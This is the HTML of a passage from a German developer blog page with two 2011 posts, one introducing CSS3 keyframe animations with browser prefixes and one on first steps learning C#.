                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
            </div>
            <a href="/artikel/2011/10/css3-animationen-ein-erster-einstieg/">
              <h2 itemprop="headline">CSS3 Animationen - Ein erster Einstieg</h2>
            </a>

            
            <div class="warning">
                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
            </div>
            
        </header>
        <div itemprop="articleBody">
            <p><p>Vielleicht haben Sie schon einmal davon gehört: CSS3-Animationen. Es soll also möglich sein nur mit CSS eine kleine Animation zu erstellen. Doch wie geht das?
Am Besten probieren wir es einmal an einem kleinen Beispiel, um die Grundzüge zu verstehen.</p>
<p>Wir nehmen an, wir wollen einen einfachen Text rotieren lassen:</p>
<p><a href="http://demo.johannes-mittendorfer.com/css3animation/">Demo</a></p>
<p>Zuerst wird die Animation im CSS der Seite definiert:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>@<span style="color:#00f">keyframes</span> <span style="color:#000">move</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#000">50</span>% { <span style="color:#00f">margin-left</span>: <span style="color:#3af">500</span><span style="color:#00f">px</span>;}
</span></span><span style="display:flex;"><span>	<span style="color:#000">100</span>% { <span style="color:#00f">transform</span>: <span style="color:#000">rotate</span>(<span style="color:#3af">360</span><span style="color:#00f">deg</span>);}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Zur Erklärung: Man erstellt ein Definition mit dem Namen <code>@keyframes</code> und benennt es ganz nach seinen Vorlieben. Ich habe die Animation hier <em>move</em> genannt. In den Anweisungen für dieses Element wird für die jeweiligen Animationsfortschritt in Prozent der Zustand abspeichern. Hier zum Beispiel eine Rotation um 360° und bei 50% eine Verchiebung zu <em>margin-left: 500px</em>.</p>
<p>Aber: So einfach läuft es auf der Welt einfach nun einmal nicht: Natürlich funktioniert es bei Firefox nur mit  <code>@-moz-keyframes</code> und bei Safari und Chrome nur mit <code>@-webkit-keyframes</code> und <em>transform</em> braucht natürlich auch noch ein Prefix. Und ja: Der Internet-Explorer fällt durch, war ja klar.</p>
<p>Also nochmal für alle:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>@<span style="color:#00f">keyframes</span> <span style="color:#000">move</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#000">50</span>% { <span style="color:#00f">margin-left</span>: <span style="color:#3af">500</span><span style="color:#00f">px</span>;}
</span></span><span style="display:flex;"><span>  <span style="color:#000">100</span>% { <span style="color:#00f">transform</span>: <span style="color:#000">rotate</span>(<span style="color:#3af">360</span><span style="color:#00f">deg</span>);}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>@<span style="color:#00f">-moz-keyframes</span> <span style="color:#000">move</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#000">50</span>% { <span style="color:#00f">margin-left</span>: <span style="color:#3af">500</span><span style="color:#00f">px</span>;}
</span></span><span style="display:flex;"><span>  <span style="color:#000">100</span>% { <span style="color:#00f">-moz-</span><span style="color:#00f">transform</span>: <span style="color:#000">rotate</span>(<span style="color:#3af">360</span><span style="color:#00f">deg</span>);}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>@<span style="color:#00f">-webkit-keyframes</span> <span style="color:#000">move</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#000">50</span>% { <span style="color:#00f">margin-left</span>: <span style="color:#3af">500</span><span style="color:#00f">px</span>;}
</span></span><span style="display:flex;"><span>	<span style="color:#000">100</span>% { <span style="color:#00f">-webkit-</span><span style="color:#00f">transform</span>: <span style="color:#000">rotate</span>(<span style="color:#3af">360</span><span style="color:#00f">deg</span>);}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Jetzt wird der CSS-Definition die gewünschte Animation zugewiesen:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>.<span style="color:#000">demo_object</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#00f">animation</span>: <span style="color:#00f">move</span> <span style="color:#3af">2</span><span style="color:#00f">s</span> <span style="color:#00f">infinite</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Es läuft also nach dem Muster:</p>
<p><em>animation: <!-- raw HTML omitted --> &lt;Länge der Animation&gt; [unendlichkeit (optional)]</em></p>
<p>Man gibt den Namen der Animation, die vorher definiert wurde und danach die gewünschte Länge der Animation an. Zusätzlich kann man noch defninieren, ob die Animation unendlich wiederholt werden soll, und zwar mit <em>infinite</em>.</p>
<p>Und, Sie ahnen es schon, das Spiel wiederholt sich. Also:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span>.<span style="color:#000">demo_object</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#00f">animation</span>: <span style="color:#00f">move</span> <span style="color:#3af">2</span><span style="color:#00f">s</span> <span style="color:#00f">infinite</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#00f">-moz-</span><span style="color:#00f">animation</span>: <span style="color:#00f">move</span> <span style="color:#3af">2</span><span style="color:#00f">s</span> <span style="color:#00f">infinite</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#00f">-webkit-</span><span style="color:#00f">animation</span>: <span style="color:#00f">move</span> <span style="color:#3af">2</span><span style="color:#00f">s</span> <span style="color:#00f">infinite</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>CSS-Animationen stellen schon heute eine gute Möglichkeit dar HTML-Elemente zu animieren. Zu wüschen wäre jedoch eine bessere Unterstützung der Browser und kein Zwang zur Nutzung der browserspezifischen Prefixe.
Da der Internet-Explorer jedoch immer noch eine große Verbreitung aufweist, muss mit der Verwendung noch ein wenig gespart werden, bzw. ein Fallback angeboten werden.</p>
</p>
        </div>
    </article>
    
    <article itemscope itemtype="http://schema.org/BlogPosting">
        <header>
            <div class="meta">
                <span class="category">Entwicklung</span> &ndash; 
                <time itemprop="datePublished" datetime="2011-09-20 00:00:00 &#43;0000 UTC" class="date">20.09.2011</time> &ndash;
                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
            </div>
            <a href="/artikel/2011/09/c#-und-ich/">
              <h2 itemprop="headline">C# und Ich</h2>
            </a>

            
            <div class="warning">
                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
            </div>
            
        </header>
        <div itemprop="articleBody">
            <p><p>Mit der Zeit muss man sich auch wieder einmal an etwas Neuem versuchen. Genau das habe ich jetzt gemacht und somit habe ich angefangen C# zu lernen. Zu empfehlen ist dazu eine IDE, also eine integrierte Entwicklungsumgebung. Ich habe Microsoft Visual C# Express von Microsoft verwendet, das man <a href="http://www.microsoft.com/germany/express/download/default.aspx">hier</a> downloaden kann. Der Download und die Installation kann hierbei jedoch eine Weile dauern.</p>
<p><img src="/img/picture_34.png" alt="C#"></p>
<p>Was man also dazu braucht:</p>
<ul>
<li>Microsoft Visual C#</li>
<li>Geduld</li>
</ul>
<p>Wenn man, so wie ich, von PHP kommt ist erst einmal zu beachten, dass man genau angeben muss welcher Typ in einer Variable abgespeichert wird. Zum Beispiel:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#000">String</span> <span style="color:#000">variable</span> = <span style="color:#5a2">&#34;Hallo Welt&#34;</span>;
</span></span></code></pre></div><p>oder</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#000">Double</span> <span style="color:#000">result</span> = <span style="color:#3af">12</span> * <span style="color:#3af">234</span>;
</span></span></code></pre></div><p>Natürlich gibt es noch weitere, aber so weit bin ich eben auch noch nicht.
Man kann im Entwurfsfenster die Anordnung der Elemente verändern und sie auch umbenennen. Dann gibt man im Code, zu dem man durch einen Doppelklick kommt, den Namen des Elementes ein und es werden einem die verschiedenen Methoden und Eigenschaften vorgeschlagen. Den Text eines Textfeldes ruft man zum Beispiel so ab:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#000">String</span> <span style="color:#000">text</span> = <span style="color:#000">meinetextbox</span>.<span style="color:#000">Text</span>;
</span></span></code></pre></div><p>Vielleicht kommen ja in nächster Zeit weitere Beiträge zu C#!</p>
</p>
        </div>
    </article>
    
</div>

<nav id="pagenav">
    
    <span id="left">
        <a href="/23/" rel="prev">« NEUER</a>
    </span>
    
    <span id="pages">
        
        <a href="/">1</a>
        
        <a href="/2/">2</a>
        
        <a href="/3/">3</a>
        
        <a href="/4/">4</a>
        
        <a href="/5/">5</a>
        
        <a href="/6/">6</a>
        
        <a href="/7/">7</a>
        
        <a href="/8/">8</a>
        
        <a href="/9/">9</a>
        
        <a href="/10/">10</a>
        
        <a href="/11/">11</a>
        
        <a href="/12/">12</a>
        
        <a href="/13/">13</a>
        
        <a href="/14/">14</a>
        
        <a href="/15/">15</a>
        
        <a href="/16/">16</a>
        
        <a href="/17/">17</a>
        
        <a href="/18/">18</a>
        
        <a href="/19/">19</a>
        
        <a href="/20/">20</a>
        
        <a href="/21/">21</a>
        
        <a href="/22/">22</a>
        
        <a href="/23/">23</a>
        
        <a href="/24/">24</a>
        
        <a href="/25/">25</a>
        
        <a href="/26/">26</a>
        
        <a href="/27/">27</a>
        
    </span>
    
    <span id="right">
        <a href="/25/" rel="next">ÄLTER »</a>
    </span>
    
</nav>

            </main>
        </div>
    </body>
</html>
